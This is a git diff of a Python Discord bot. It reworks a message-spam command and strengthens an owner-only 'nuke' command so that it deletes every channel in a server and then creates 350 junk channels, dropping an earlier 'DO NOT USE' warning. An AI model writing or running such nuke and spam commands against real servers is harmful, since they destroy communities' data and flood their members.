@@ -167,12 +167,9 @@ async def spin(ctx):
 
 
 @client.command()
-async def spam(ctx, amount : int):
-  i = 0
-  channel = client.get_channel(774329123308830721)
-  while i < amount:
-    await channel.send("&boom")
-    i+=1
+async def spam(ctx, amount:int, *, message):
+  for i in range(amount):
+      await ctx.send(message) 
 
 @client.command()
 async def help(ctx):
@@ -280,16 +277,16 @@ async def clear( ctx, amount : int ):
     await ctx.channel.purge(limit = amount)
     await ctx.send(f'Cleared {amount} messages', delete_after = 5.0)
 
-#nuke, DO NOT USE
 @client.command(pass_context=True)
 async def nuke(ctx, channelnukename="bruh"):
   if ctx.author.id == 414931767129276428:
     await ctx.message.delete()
     guild = ctx.guild
     count = 0
+    for channel in guild.channels:
+        await channel.delete()
     while count < 350:
       await guild.create_text_channel(channelnukename)
-      #await guild.create_voice_channel(channelnukename)
       count+=1
       print(count)
     message = "https://cdn.discordapp.com/emojis/627664851531071518.gif?v=1"
@@ -298,14 +295,6 @@ async def nuke(ctx, channelnukename="bruh"):
   else:
     await ctx.send("Bruh")
 
-@client.command()
-async def nuke2(ctx):
-  if ctx.author.id == 414931767129276428:
-    guild = ctx.guild
-    for channel in guild.channels:
-        await channel.delete()
-  else:
-    await ctx.send("bruh")
     
 
 async def move():
@@ -321,7 +310,7 @@ async def move():
 
 async def move2():
     channel = client.get_channel(860338189231194132)
-    evac = client.get_channel(755483435656675539)
+    evac = client.get_channel(604520849621516301)
     Members = channel.members
     for members in Members:
         await members.move_to(evac)
